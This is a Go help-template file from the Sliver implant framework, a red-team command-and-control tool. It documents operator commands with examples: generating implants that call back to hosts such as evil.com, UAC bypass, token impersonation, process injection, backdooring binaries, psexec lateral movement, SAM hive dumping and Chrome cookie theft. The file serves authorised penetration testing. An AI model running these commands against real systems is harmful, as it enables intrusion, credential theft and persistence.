package help

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.

	---
	This file contains all of the long-form help templates, all commands should have a long form help,
	even if the command is pretty simple. Try to include example commands in your template.
*/

import (
	"bytes"
	"fmt"
	"strings"
	"text/template"

	consts "github.com/bishopfox/sliver/client/constants"
)

const (
	sep = "."
)

var (

	// NOTE: For sub-commands use a "." hierarchy, for example root.sub for "sub" help
	cmdHelp = map[string]string{
		consts.JobsStr:          jobsHelp,
		consts.SessionsStr:      sessionsHelp,
		consts.BackgroundStr:    backgroundHelp,
		consts.InfoStr:          infoHelp,
		consts.UseStr:           useHelp,
		consts.GenerateStr:      generateHelp,
		consts.StageListenerStr: stageListenerHelp,

		consts.MsfStr:              msfHelp,
		consts.MsfInjectStr:        msfInjectHelp,
		consts.PsStr:               psHelp,
		consts.PingStr:             pingHelp,
		consts.KillStr:             killHelp,
		consts.LsStr:               lsHelp,
		consts.CdStr:               cdHelp,
		consts.PwdStr:              pwdHelp,
		consts.CatStr:              catHelp,
		consts.DownloadStr:         downloadHelp,
		consts.GrepStr:             grepHelp,
		consts.HeadStr:             headHelp,
		consts.TailStr:             tailHelp,
		consts.UploadStr:           uploadHelp,
		consts.MkdirStr:            mkdirHelp,
		consts.RmStr:               rmHelp,
		consts.ProcdumpStr:         procdumpHelp,
		consts.ElevateStr:          elevateHelp,
		consts.RunAsStr:            runAsHelp,
		consts.ImpersonateStr:      impersonateHelp,
		consts.RevToSelfStr:        revToSelfHelp,
		consts.ExecuteAssemblyStr:  executeAssemblyHelp,
		consts.ExecuteShellcodeStr: executeShellcodeHelp,
		consts.MigrateStr:          migrateHelp,
		consts.SideloadStr:         sideloadHelp,
		consts.TerminateStr:        terminateHelp,
		consts.AliasesStr:          loadAliasHelp,
		consts.PsExecStr:           psExecHelp,
		consts.BackdoorStr:         backdoorHelp,
		consts.SpawnDllStr:         spawnDllHelp,
		consts.MountStr:            mountHelp,

		consts.WebsitesStr:                                  websitesHelp,
		consts.ScreenshotStr:                                screenshotHelp,
		consts.MakeTokenStr:                                 makeTokenHelp,
		consts.EnvStr:                                       getEnvHelp,
		consts.EnvStr + sep + consts.SetStr:                 setEnvHelp,
		consts.RegistryWriteStr:                             regWriteHelp,
		consts.RegistryReadStr:                              regReadHelp,
		consts.RegistryCreateKeyStr:                         regCreateKeyHelp,
		consts.RegistryDeleteKeyStr:                         regDeleteKeyHelp,
		consts.RegistryReadStr + consts.RegistryReadHiveStr: regReadHiveHelp,
		consts.PivotsStr:                                    pivotsHelp,
		consts.WgPortFwdStr:                                 wgPortFwdHelp,
		consts.WgSocksStr:                                   wgSocksHelp,
		consts.SSHStr:                                       sshHelp,
		consts.DLLHijackStr:                                 dllHijackHelp,
		consts.GetPrivsStr:                                  getPrivsHelp,
		consts.ServicesStr:                                  servicesHelp,

		// Loot
		consts.LootStr: lootHelp,

		// Creds
		consts.CredsStr:                       credsHelp,
		consts.CredsStr + sep + consts.AddStr: credsAddHelp,
		consts.CredsStr + sep + consts.AddStr + sep + consts.FileStr: credsAddFileHelp,
		// Profiles
		consts.ProfilesStr + sep + consts.NewStr:      newProfileHelp,
		consts.ProfilesStr + sep + consts.GenerateStr: generateProfileHelp,
		consts.ProfilesStr + sep + consts.StageStr:    generateProfileStageHelp,

		// Reactions
		consts.ReactionStr:                         reactionHelp,
		consts.ReactionStr + sep + consts.SetStr:   reactionSetHelp,
		consts.ReactionStr + sep + consts.UnsetStr: reactionUnsetHelp,

		consts.Cursed + sep + consts.CursedChrome: cursedChromeHelp,

		// Builders
		consts.BuildersStr: buildersHelp,

		// HTTP C2
		consts.C2ProfileStr: c2ProfilesHelp,
		consts.C2ProfileStr + sep + consts.C2GenerateStr: c2GenerateHelp,
	}

	jobsHelp = `[[.Bold]]Command:[[.Normal]] jobs <options>
	[[.Bold]]About:[[.Normal]] Manage jobs/listeners.`

	sessionsHelp = `[[.Bold]]Command:[[.Normal]] sessions <options>
[[.Bold]]About:[[.Normal]] List Sliver sessions, and optionally interact or kill a session. Process integrity information is only available on Windows and is updated each time the getprivs command is executed.`

	backgroundHelp = `[[.Bold]]Command:[[.Normal]] background
[[.Bold]]About:[[.Normal]] Background the active Sliver.`

	infoHelp = `[[.Bold]]Command:[[.Normal]] info <sliver name/session>
[[.Bold]]About:[[.Normal]] Get information about a Sliver by name, or for the active Sliver.`

	useHelp = `[[.Bold]]Command:[[.Normal]] use [sliver name/session]
[[.Bold]]About:[[.Normal]] Switch the active Sliver, a valid name must be provided (see sessions).`

	generateHelp = `[[.Bold]]Command:[[.Normal]] generate <options>
[[.Bold]]About:[[.Normal]] Generate a new sliver binary and saves the output to the cwd or a path specified with --save.

[[.Bold]][[.Underline]]++ Command and Control ++[[.Normal]]
You must specificy at least one c2 endpoint when generating an implant, this can be one or more of --mtls, --wg, --http, or --dns, --named-pipe, or --tcp-pivot.
The command requires at least one use of --mtls, --wg, --http, or --dns, --named-pipe, or --tcp-pivot.

The follow command is used to generate a sliver Windows executable (PE) file, that will connect back to the server using mutual-TLS:
	generate --mtls foo.example.com 

The follow command is used to generate a sliver Windows executable (PE) file, that will connect back to the server using Wireguard on UDP port 9090,
then connect to TCP port 1337 on the server's virtual tunnel interface to retrieve new wireguard keys, re-establish the wireguard connection using the new keys, 
then connect to TCP port 8888 on the server's virtual tunnel interface to establish c2 comms.
	generate --wg 3.3.3.3:9090 --key-exchange 1337 --tcp-comms 8888

You can also stack the C2 configuration with multiple protocols:
	generate --os linux --mtls example.com,domain.com --http bar1.evil.com,bar2.attacker.com --dns baz.bishopfox.com


[[.Bold]][[.Underline]]++ Formats ++[[.Normal]]
Supported output formats are Windows PE, Windows DLL, Windows Shellcode, Mach-O, and ELF. The output format is controlled
with the --os and --format flags.

To output a 64bit Windows PE file (defaults to WinPE/64bit), either of the following command would be used:
	generate --mtls foo.example.com 
	generate --os windows --arch 64bit --mtls foo.example.com

A Windows DLL can be generated with the following command:
	generate --format shared --mtls foo.example.com

To output a MacOS Mach-O executable file, the following command would be used
	generate --os mac --mtls foo.example.com 

To output a Linux ELF executable file, the following command would be used:
	generate --os linux --mtls foo.example.com 


[[.Bold]][[.Underline]]++ DNS Canaries ++[[.Normal]]
DNS canaries are unique per-binary domains that are deliberately NOT obfuscated during the compilation process. 
This is done so that these unique domains show up if someone runs 'strings' on the binary, if they then attempt 
to probe the endpoint or otherwise resolve the domain you'll be alerted that your implant has been discovered, 
and which implant file was discovered along with any affected sessions.

[[.Bold]]Important:[[.Normal]] You must have a DNS listener/server running to detect the DNS queries (see the "dns" command).

Unique canary subdomains are automatically generated and inserted using the --canary flag. You can view previously generated 
canaries and their status using the "canaries" command:
	generate --mtls foo.example.com --canary 1.foobar.com

[[.Bold]][[.Underline]]++ Execution Limits ++[[.Normal]]
Execution limits can be used to restrict the execution of a Sliver implant to machines with specific configurations.

[[.Bold]][[.Underline]]++ Profiles ++[[.Normal]]
Due to the large number of options and C2s this can be a lot of typing. If you'd like to have a reusable a Sliver config
see 'help profiles new'. All "generate" flags can be saved into a profile, you can view existing profiles with the "profiles"
command.
`
	stageListenerHelp = `[[.Bold]]Command:[[.Normal]] stage-listener <options>
[[.Bold]]About:[[.Normal]] Starts a stager listener bound to a Sliver profile.
[[.Bold]]Examples:[[.Normal]] 

The following command will start a TCP listener on 1.2.3.4:8080, and link the [[.Bold]]my-sliver-profile[[.Normal]] profile to it.
When a stager calls back to this URL, a sliver corresponding to the said profile will be sent.

stage-listener --url tcp://1.2.3.4:8080 --profile my-sliver-profile

To create a profile, use the [[.Bold]]profiles new[[.Normal]] command. A common scenario is to create a profile that generates a shellcode, which can act as a stage 2:

profiles new --format shellcode --mtls 1.2.3.4 --skip-symbols windows-shellcode
`

	newProfileHelp = `[[.Bold]]Command:[[.Normal]] new <options> <profile name>
[[.Bold]]About:[[.Normal]] Create a new profile with a given name and options, a name is required.

[[.Bold]][[.Underline]]++ Profiles ++[[.Normal]]
Profiles are an easy way to save an implant configuration and easily generate multiple copies of the binary with the same
settings. Generated implants will still have per-binary certificates/obfuscation/etc. This command is used with "profiles generate":
	profiles new --mtls foo.example.com --canary 1.foobar.com my-profile-name
	profiles generate my-profile-name
`

	generateProfileHelp = `[[.Bold]]Command:[[.Normal]] generate [name] <options>
[[.Bold]]About:[[.Normal]] Generate an implant from a saved profile (see 'profiles new --help').`

	generateProfileStageHelp = `[[.Bold]]Command:[[.Normal]] stage [name] <options>
	[[.Bold]]About:[[.Normal]] Generate and encrypt or encode an implant from a saved profile (see 'profiles stage --help').`

	msfHelp = `[[.Bold]]Command:[[.Normal]] msf [--lhost] <options>
[[.Bold]]About:[[.Normal]] Execute a metasploit payload in the current process.`

	msfInjectHelp = `[[.Bold]]Command:[[.Normal]] inject [--pid] [--lhost] <options>
[[.Bold]]About:[[.Normal]] Execute a metasploit payload in a remote process.`

	psHelp = `[[.Bold]]Command:[[.Normal]] ps <options>
[[.Bold]]About:[[.Normal]] List processes on remote system.`

	pingHelp = `[[.Bold]]Command:[[.Normal]] ping <implant name/session>
[[.Bold]]About:[[.Normal]] Ping session by name or the active session. This does NOT send an ICMP packet, it just sends a small 
C2 message round trip to ensure the remote implant is still responding to commands.`

	killHelp = `[[.Bold]]Command:[[.Normal]] kill <implant name/session>
[[.Bold]]About:[[.Normal]] Kill a remote implant process (does not delete file).`

	lsHelp = `[[.Bold]]Command:[[.Normal]] ls <remote path>
[[.Bold]]About:[[.Normal]] List remote files in current directory, or path if provided.

[[.Bold]][[.Underline]]Sorting[[.Normal]]
Directory and file listings are sorted by name in ascending order by default.  Listings can also be sorted by size (-s) and modified time (-m).  All sorts can be reversed with -r.

[[.Bold]][[.Underline]]Filters[[.Normal]]
Filters are a way to limit search results to directory and file names matching given criteria.

Filters are specified after the path.  A blank path will filter on names in the current directory.  For example:
/etc/passwd will display the listing for /etc/passwd.  "/etc/" is the path, and "passwd" is the filter.

Directory and file listings can be filtered using the following patterns:
'*': Wildcard, matches any sequence of non-path separators (slashes)
	Example: n*.txt will match all file and directory names starting with n and ending with .txt

'?': Single character wildcard, matches a single non-path separator (slashes)
	Example: s?iver will match all file and directory names starting with s followed by any non-separator character and ending with iver.

'[{range}]': Match a range of characters.  Ranges are specified with '-'. This is usually combined with other patterns. Ranges can be negated with '^'.
	Example: [a-c] will match the characters a, b, and c.  [a-c]* will match all directory and file names that start with a, b, or c.
		^[r-u] will match all characters except r, s, t, and u.

If you need to match a special character (*, ?, '-', '[', ']', '\\'), place '\\' in front of it (example: \\?).
On Windows, escaping is disabled. Instead, '\\' is treated as path separator.
`

	cdHelp = `[[.Bold]]Command:[[.Normal]] cd [remote path]
[[.Bold]]About:[[.Normal]] Change working directory of the active session.`

	pwdHelp = `[[.Bold]]Command:[[.Normal]] pwd
[[.Bold]]About:[[.Normal]] Print working directory of the active session.`

	mkdirHelp = `[[.Bold]]Command:[[.Normal]] mkdir [remote path]
[[.Bold]]About:[[.Normal]] Create a remote directory.`

	rmHelp = `[[.Bold]]Command:[[.Normal]] rm [remote path]
[[.Bold]]About:[[.Normal]] Delete a remote file or directory.`

	catHelp = `[[.Bold]]Command:[[.Normal]] cat <remote path> 
[[.Bold]]About:[[.Normal]] Cat a remote file to stdout.`

	downloadHelp = `[[.Bold]]Command:[[.Normal]] download [remote src] <local dst>
[[.Bold]]About:[[.Normal]] Download a file or directory from the remote system. Directories will be downloaded as a gzipped TAR file.
[[.Bold]][[.Underline]]Filters[[.Normal]]
Filters are a way to limit downloads to file names matching given criteria. Filters DO NOT apply to directory names.

Filters are specified after the path.  A blank path will filter on names in the current directory.  For example:
download /etc/*.conf will download all files from /etc whose names end in .conf. /etc/ is the path, *.conf is the filter.

Downloads can be filtered using the following patterns:
'*': Wildcard, matches any sequence of non-path separators (slashes)
	Example: n*.txt will match all file names starting with n and ending with .txt

'?': Single character wildcard, matches a single non-path separator (slashes)
	Example: s?iver will match all file names starting with s followed by any non-separator character and ending with iver.

'[{range}]': Match a range of characters.  Ranges are specified with '-'. This is usually combined with other patterns. Ranges can be negated with '^'.
	Example: [a-c] will match the characters a, b, and c.  [a-c]* will match all file names that start with a, b, or c.
		^[r-u] will match all characters except r, s, t, and u.

If you need to match a special character (*, ?, '-', '[', ']', '\\'), place '\\' in front of it (example: \\?).
On Windows, escaping is disabled. Instead, '\\' is treated as path separator.`

	headHelp = `[[.Bold]]Command:[[.Normal]] head [--bytes/-b <number of bytes>] [--lines/-l <number of lines>] <remote path> 
	[[.Bold]]About:[[.Normal]] Fetch the first number of bytes or lines from a remote file and display it to stdout.`

	tailHelp = `[[.Bold]]Command:[[.Normal]] tail [--bytes/-b <number of bytes>] [--lines/-l <number of lines>] <remote path> 
	[[.Bold]]About:[[.Normal]] Fetch the last number of bytes or lines from a remote file and display it to stdout.`

	uploadHelp = `[[.Bold]]Command:[[.Normal]] upload [local src] <remote dst>
[[.Bold]]About:[[.Normal]] Upload a file or directory to the remote system.
[[.Bold]][[.Underline]]Paths[[.Normal]]
You can preserve directory structures using the -p switch. Directories will be preserved as they are specified in the source path.
For example, the command upload -p /home/me/docs /tmp will upload the files in /home/me/docs to /tmp/home/me/docs on the target.
However, if you are in the local directory /home/me, and issue the command upload -p docs /tmp, the files in /home/me/docs will
be uploaded to /tmp/docs on the target. This is equivalent to upload /home/me/docs /tmp/docs (notice the lack of the -p switch).
[[.Bold]][[.Underline]]Filters[[.Normal]]
Filters are a way to limit uploads to file names matching given criteria. Filters DO NOT apply to directory names.

Filters are specified after the path.  A blank path will filter on names in the current directory.  For example:
upload /etc/*.conf will upload all files from /etc whose names end in .conf. /etc/ is the path, *.conf is the filter.

Uploads can be filtered using the following patterns:
'*': Wildcard, matches any sequence of non-path separators (slashes)
	Example: n*.txt will match all file names starting with n and ending with .txt

'?': Single character wildcard, matches a single non-path separator (slashes)
	Example: s?iver will match all file names starting with s followed by any non-separator character and ending with iver.

'[{range}]': Match a range of characters.  Ranges are specified with '-'. This is usually combined with other patterns. Ranges can be negated with '^'.
	Example: [a-c] will match the characters a, b, and c.  [a-c]* will match all file names that start with a, b, or c.
		^[r-u] will match all characters except r, s, t, and u.

If you need to match a special character (*, ?, '-', '[', ']', '\\'), place '\\' in front of it (example: \\?).
On Windows, escaping is disabled. Instead, '\\' is treated as path separator.`

	procdumpHelp = `[[.Bold]]Command:[[.Normal]] procdump [pid]
[[.Bold]]About:[[.Normal]] Dumps the process memory given a process identifier (pid)`

	runAsHelp = `[[.Bold]]Command:[[.Normal]] runas [--username] [--process] [--args]
[[.Bold]]About:[[.Normal]] (Windows Only) Run a new process in the context of the designated user`

	impersonateHelp = `[[.Bold]]Command:[[.Normal]] impersonate USERNAME
[[.Bold]]About:[[.Normal]] (Windows Only) Steal the token of a logged in user. Sliver commands that run new processes (like [[.Bold]]shell[[.Normal]] or [[.Bold]]execute-command[[.Normal]]) will impersonate this user.`

	revToSelfHelp = `[[.Bold]]Command:[[.Normal]] rev2self
[[.Bold]]About:[[.Normal]] (Windows Only) Call RevertToSelf, lose the stolen token.`

	elevateHelp = `[[.Bold]]Command:[[.Normal]] elevate
[[.Bold]]About:[[.Normal]] (Windows Only) Spawn a new Sliver session as an elevated process (UAC bypass)`

	executeAssemblyHelp = `[[.Bold]]Command:[[.Normal]] execute-assembly [local path to assembly] [arguments]
[[.Bold]]About:[[.Normal]] (Windows Only) Executes the .NET assembly in a child process.
`

	mountHelp = `[[.Bold]]Command:[[.Normal]] mount
[[.Bold]]About:[[.Normal]] Displays information about mounted drives on the system, including mount point, space metrics, and filesystem.`

	executeShellcodeHelp = `[[.Bold]]Command:[[.Normal]] execute-shellcode [local path to raw shellcode]
[[.Bold]]About:[[.Normal]] Executes the given shellcode in the implant's process.

[[.Bold]][[.Underline]]++ Shellcode ++[[.Normal]]
Shellcode files should be binary encoded, you can generate Sliver shellcode files with the generate command:
	generate --format shellcode
`

	migrateHelp = `[[.Bold]]Command:[[.Normal]] migrate <flags>
[[.Bold]]About:[[.Normal]] (Windows Only) Migrates into the process designated by <flags>.`

	websitesHelp = `[[.Bold]]Command:[[.Normal]] websites <options> <operation>
[[.Bold]]About:[[.Normal]] Add content to HTTP(S) C2 websites to make them look more legit.

Websites can be thought of as a collection of content identified by a name, Sliver can store any number of
websites, and each website can host any amount of static content mapped to arbitrary paths. For example, you
could create a 'blog' website and 'corp' website each with its own collection of content. When starting an
HTTP(S) C2 listener you can specify which collection of content to host on the C2 endpoint.

[[.Bold]][[.Underline]]++ Examples ++[[.Normal]]
List websites:
	websites

List the contents of a website:
	websites [name]

Add content to a website:
	websites add-content --website blog --web-path / --content ./index.html
	websites add-content --website blog --web-path /public --content ./public --recursive

Delete content from a website:
	websites rm-content --website blog --web-path /index.html
	websites rm-content --website blog --web-path /public --recursive

`
	sideloadHelp = `[[.Bold]]Command:[[.Normal]] sideload <options> <filepath to DLL>
[[.Bold]]About:[[.Normal]] Load and execute a shared library in memory in a remote process.
[[.Bold]]Example usage:[[.Normal]]

Sideload a MacOS shared library into a new process using DYLD_INSERT_LIBRARIES:
	sideload -p /Applications/Safari.app/Contents/MacOS/SafariForWebKitDevelopment -a 'Hello World' /tmp/mylib.dylib
Sideload a Linux shared library into a new bash process using LD_PRELOAD:
	sideload -p /bin/bash /tmp/mylib.so
Sideload a Windows DLL as shellcode in a new process using Donut, specifying the entrypoint and its arguments:
	sideload -e MyEntryPoint /tmp/mylib.dll "argument to the function MyEntryPoint"

[[.Bold]]Remarks:[[.Normal]]
Linux and MacOS shared library must call exit() once done with their jobs, as the Sliver implant will wait until the hosting process
terminates before responding. This will also prevent the hosting process to run indefinitely.
This is not required on Windows since the payload is injected as a new remote thread, and we wait for the thread completion before
killing the hosting process.

Parameters to the Linux and MacOS shared module are passed using the [[.Bold]]LD_PARAMS[[.Normal]] environment variable.
`
	spawnDllHelp = `[[.Bold]]Command:[[.Normal]] spawndll <options> <filepath to DLL> [entrypoint arguments]
[[.Bold]]About:[[.Normal]] Load and execute a Reflective DLL in memory in a remote process.

[[.Bold]]--process[[.Normal]] - Process to inject into.
[[.Bold]]--export[[.Normal]] - Name of the export to call (default: ReflectiveLoader)
`

	terminateHelp = `[[.Bold]]Command:[[.Normal]] terminate PID
[[.Bold]]About:[[.Normal]] Kills a remote process designated by PID
`

	screenshotHelp = `[[.Bold]]Command:[[.Normal]] screenshot
[[.Bold]]About:[[.Normal]] Take a screenshot from the remote implant.
`
	loadAliasHelp = `[[.Bold]]Command:[[.Normal]] load-macro <directory path> 
[[.Bold]]About:[[.Normal]] Load a Sliver macro to add new commands.
Macros are using the [[.Bold]]sideload[[.Normal]] or [[.Bold]]spawndll[[.Normal]] commands under the hood, depending on the use case.
For Linux and Mac OS, the [[.Bold]]sideload[[.Normal]] command will be used. On Windows, it will depend the macro file is a reflective DLL or not.
Load an macro:
	load /tmp/chrome-dump
Sliver macros have the following structure (example for the [[.Bold]]chrome-dump[[.Normal]] macro):
chrome-dump
├── chrome-dump.dll
├── chrome-dump.so
└── manifest.json
It is a directory containing any number of files, with a mandatory [[.Bold]]manifest.json[[.Normal]], that has the following structure:
{
  "macroName":"chrome-dump", // name of the macro, can be anything
  "macroCommands":[
    {
      "name":"chrome-dump", // name of the command available in the sliver client (no space)
      "entrypoint":"ChromeDump", // entrypoint of the shared library to execute
      "help":"Dump Google Chrome cookies", // short help message
      "allowArgs":false,  // make it true if the commands require arguments
	  "defaultArgs": "test", // if you need to pass a default argument
      "extFiles":[ // list of files, groupped per target OS
        {
		  "os":"windows", // Target OS for the following files. Values can be "windows", "linux" or "darwin"
          "files":{
            "x64":"chrome-dump.dll",
            "x86":"chrome-dump.x86.dll" // only x86 and x64 arch are supported, path is relative to the macro directory
          }
        },
        {
          "os":"linux",
          "files":{
            "x64":"chrome-dump.so"
          }
        },
        {
          "os":"darwin",
          "files":{
            "x64":"chrome-dump.dylib"
          }
        }
      ],
      "isReflective":false // only set to true when using a reflective DLL
    }
  ]
}

Each command will have the [[.Bold]]--process[[.Normal]] flag defined, which allows you to specify the process to inject into. The following default values are set:
 - Windows: c:\windows\system32\notepad.exe
 - Linux: /bin/bash
 - Mac OS X: /Applications/Safari.app/Contents/MacOS/SafariForWebKitDevelopment
`
	psExecHelp = `[[.Bold]]Command:[[.Normal]] psexec <target>
[[.Bold]]About:[[.Normal]] Start a new sliver as a service on a remote target.

This command uploads a Sliver binary generated on the fly from a profile.
The profile must be created with the [[.Bold]]service[[.Normal]] format, so that the service manager can properly start and stop the binary.

To create such a profile, use the [[.Bold]]profiles new[[.Normal]] command:

profiles new --format service --skip-symbols --mtls a.bc.de win-svc64

Once the profile has been created, run the [[.Bold]]psexec[[.Normal]] command:

psexec -d Description -s ServiceName -p win-svc64 TARGET_FQDN

The [[.Bold]]psexec[[.Normal]] command will use the credentials of the Windows user associated with the current Sliver session.
`
	backdoorHelp = `[[.Bold]]Command:[[.Normal]] backdoor <remote file path>
[[.Bold]]About:[[.Normal]] Inject a sliver shellcode into an existing file on the target system.
[[.Bold]]Example:[[.Normal]] backdoor --profile windows-shellcode "c:\windows\system32\calc.exe"

[[.Bold]]Remark:[[.Normal]] you must first create a profile that will serve as your base shellcode, with the following command: profiles new --format shellcode --http ab.cd windows-shellcode
`
	makeTokenHelp = `[[.Bold]]Command:[[.Normal]] make-token -u USERNAME -d DOMAIN -p PASSWORD
[[.Bold]]About:[[.Normal]] Creates a new Logon Session from the specified credentials and impersonate the resulting token.
You can specify a custon Logon Type using the [[.Bold]]--logon-type[[.Normal]] flag, which defaults to [[.Bold]]LOGON32_LOGON_NEW_CREDENTIALS[[.Normal]].
Valid types are:

LOGON_INTERACTIVE
LOGON_NETWORK
LOGON_BATCH
LOGON_SERVICE
LOGON_UNLOCK
LOGON_NETWORK_CLEARTEXT
LOGON_NEW_CREDENTIALS
`

	getEnvHelp = `[[.Bold]]Command:[[.Normal]] getenv [name]
[[.Bold]]About:[[.Normal]] Retrieve the environment variables for the current session. If no variable name is provided, lists all the environment variables.
[[.Bold]]Example:[[.Normal]] getenv SHELL
	`
	setEnvHelp = `[[.Bold]]Command:[[.Normal]] setenv [name]
[[.Bold]]About:[[.Normal]] Set an environment variable in the current process.
[[.Bold]]Example:[[.Normal]] setenv SHELL /bin/bash
	`
	regReadHelp = `[[.Bold]]Command:[[.Normal]] registry read PATH [name]
[[.Bold]]About:[[.Normal]] Read a value from the windows registry
[[.Bold]]Example:[[.Normal]] registry read --hive HKLM "software\\google\\chrome\\BLBeacon\\version"
	`
	regWriteHelp = `[[.Bold]]Command:[[.Normal]] registry write PATH value [name]
[[.Bold]]About:[[.Normal]] Write a value to the windows registry
[[.Bold]]Example:[[.Normal]] registry write --hive HKLM --type dword "software\\google\\chrome\\BLBeacon\\version" 1234

The type flag can take the following values:

- string (regular string)
- dword (uint32)
- qword (uint64)
- binary

When using the binary type, you must either:

- pass the value as an hex encoded string: registry write --type binary --hive HKCU "software\\bla\\key\\val" 0d0a90124f
- use the --path flag to provide a filepath containg the payload you want to write: registry write --type binary --path /tmp/payload.bin --hive HKCU "software\\bla\\key\\val"

	`
	regCreateKeyHelp = `[[.Bold]]Command:[[.Normal]] registry create PATH [name]
[[.Bold]]About:[[.Normal]] Read a value from the windows registry
[[.Bold]]Example:[[.Normal]] registry create --hive HKLM "software\\google\\chrome\\BLBeacon\\version"
	`

	regDeleteKeyHelp = `[[.Bold]]Command:[[.Normal]] registry delete PATH [name]
[[.Bold]]About:[[.Normal]] Remove a value from the windows registry
[[.Bold]]Example:[[.Normal]] registry delete --hive HKLM "software\\google\\chrome\\BLBeacon\\version"
	`

	regReadHiveHelp = `[[.Bold]]Command:[[.Normal]] registry read hive [name]
[[.Bold]]About:[[.Normal]] Read the contents of a registry hive into a binary file
[[.Bold]]Example:[[.Normal]] registry read hive --hive HKLM --save SAM.save SAM
This command reads the data from a specified registry hive into a binary file, suitable for use with tools like secretsdump.
The specified hive must be relative to a root hive (such as HKLM or HKCU). For example, if you want to read the SAM hive, the
root hive is HKLM, and the specified hive is SAM.
This command requires that the process has or can get the SeBackupPrivilege privilege. If you want to dump the SAM, SECURITY, and
SYSTEM hives, your process must be running with High integrity (i.e. running as SYSTEM).

Supported root hives are:
	- HKEY_LOCAL_MACHINE (HKLM, default)
	- HKEY_CURRENT_USER (HKCU)
	- HKEY_CURRENT_CONFIG (HKCC)
	- HKEY_PERFORMANCE_DATA (HKPD)
	- HKEY_USERS (HKU)
	- HKEY_CLASSES_ROOT (HKCR)
The root hive must be specified using its abbreviation, such as HKLM, and not its full name.
This command will only run against the local machine.
	`

	pivotsHelp = `[[.Bold]]Command:[[.Normal]] pivots
[[.Bold]]About:[[.Normal]] List pivots for the current session. NOTE: pivots are only supported on sessions, not beacons.
[[.Bold]]Examples:[[.Normal]]

List pivots for the current session:

	pivots

Start a tcp pivot on the current session:

	pivots tcp --bind 0.0.0.0

`
	wgSocksHelp = `[[.Bold]]Command:[[.Normal]] wg-socks
[[.Bold]]About:[[.Normal]] Create a socks5 listener on the implant Wireguard tun interface
[[.Bold]]Examples:[[.Normal]]
Start a new listener:

	wg-socks start

Specify the listening port:

	wg-socks start --bind 1234

List existing listeners:

	wg-socks

Stop and remove an existing listener:

	wg-socks rm 0
`
	wgPortFwdHelp = `[[.Bold]]Command:[[.Normal]] wg-portfwd
[[.Bold]]About:[[.Normal]] Create a TCP port forward on the implant Wireguard tun interface
[[.Bold]]Examples:[[.Normal]]
Add a new forwarding rule:

	wg-portfwd add --remote 1.2.3.4:1234

Specify the listening port:

	wg-portfwd add --bind 1234 --remote 1.2.3.4

List existing listeners:

	wg-portfwd

Stop and remove an existing listener:

	wg-portfwd rm 0
`
	sshHelp = `[[.Bold]]Command:[[.Normal]] ssh
[[.Bold]]About:[[.Normal]] Run an one-off SSH command via the implant.
The built-in client will use the ssh-agent to connect to the remote host.
The username will be the current session username by default, but is configurable using the "-l" flag.
[[.Bold]]Examples:[[.Normal]]

# Connect to a remote host named "bastion" and execute "cat /etc/passwd"
ssh bastion cat /etc/passwd

# Connect to a remote host by specifying a username
ssh -l ubuntu ec2-instance ps aux
`

	lootHelp = `[[.Bold]]Command:[[.Normal]] loot
[[.Bold]]About:[[.Normal]] Store and share loot between operators.

A piece of loot is a file, that can be one of two loot types: text or binary. 

Sliver will attempt to detect the type of file automatically or you can specify a file type with 
--file-type. You can add local files as loot using the "local" sub-command, or you can add files
from a session using the "remote" sub-command.

[[.Bold]]Examples:[[.Normal]]

# Adding a local file (file paths are relative):
loot local ./foo.txt

# Adding a remote file from the active session:
loot remote C:/foo.txt

# Display the contents of a piece of loot:
loot fetch
`

	reactionHelp = fmt.Sprintf(`[[.Bold]]Command:[[.Normal]] reaction
[[.Bold]]About:[[.Normal]] Automate commands in reaction to event(s). The built-in
reactions do not support variables or logic, they simply allow you to run verbatim
commands when an event occurs. To implement complex event-based logic we recommend
using SliverPy (Python) or sliver-script (TypeScript/JavaScript).

[[.Bold]]Reactable Events:[[.Normal]]
% 20s  Triggered when a new session is opened to a target
% 20s  Triggered on changes to session metadata
% 20s  Triggered when a session is closed (for any reason)
% 20s  Triggered when a canary is burned or created
% 20s  Triggered when implants are discovered on threat intel platforms
% 20s  Triggered when a new piece of loot is added to the server
% 20s  Triggered when a piece of loot is removed from the server
`,
		consts.SessionOpenedEvent,
		consts.SessionUpdateEvent,
		consts.SessionClosedEvent,
		consts.CanaryEvent,
		consts.WatchtowerEvent,
		consts.LootAddedEvent,
		consts.LootRemovedEvent,
	)

	reactionSetHelp = fmt.Sprintf(`[[.Bold]]Command:[[.Normal]] reaction set
[[.Bold]]About:[[.Normal]] Set automated commands in reaction to event(s).  

The built-in reactions do not support variables or logic, they simply allow you to 
run verbatim commands when an event occurs. To implement complex event-based logic 
we recommend using SliverPy (Python) or sliver-script (TypeScript/JavaScript).

[[.Bold]]Examples:[[.Normal]]
# The command uses interactive menus to build a reaction. Simply run:
reaction set

[[.Bold]]Reactable Events:[[.Normal]]
% 20s  Triggered when a new session is opened to a target
% 20s  Triggered on changes to session metadata
% 20s  Triggered when a session is closed (for any reason)
% 20s  Triggered when a canary is burned or created
% 20s  Triggered when implants are discovered on threat intel platforms
% 20s  Triggered when a new piece of loot is added to the server
% 20s  Triggered when a piece of loot is removed from the server
	`,
		consts.SessionOpenedEvent,
		consts.SessionUpdateEvent,
		consts.SessionClosedEvent,
		consts.CanaryEvent,
		consts.WatchtowerEvent,
		consts.LootAddedEvent,
		consts.LootRemovedEvent,
	)

	reactionUnsetHelp = `[[.Bold]]Command:[[.Normal]] reaction unset
[[.Bold]]About:[[.Normal]] Unset/remove automated commands in reaction to event(s).

[[.Bold]]Examples:[[.Normal]]
# Remove a reaction
reaction unset --id 1
`
	dllHijackHelp = `[[.Bold]]Command:[[.Normal]] dllhijack
[[.Bold]]About:[[.Normal]] Prepare and plant a DLL on the remote system for a hijack scenario.
The planted DLL will have its export directory modified to forward the exports to a reference DLL
on the remote system.
The DLL used for the hijack can either be a file on the operator's system or built from a Sliver profile,
supplied with the --profile flag.

[[.Bold]]Examples:[[.Normal]]
# Use a local DLL for a hijack
dllhijack --reference-path c:\\windows\\system32\\msasn1.dll --file /tmp/blah.dll c:\\users\\bob\\appdata\\slack\\app-4.18.0\\msasn1.dll

# Use a Sliver generated DLL for the hijack (you must specify -R or --run-at-load)
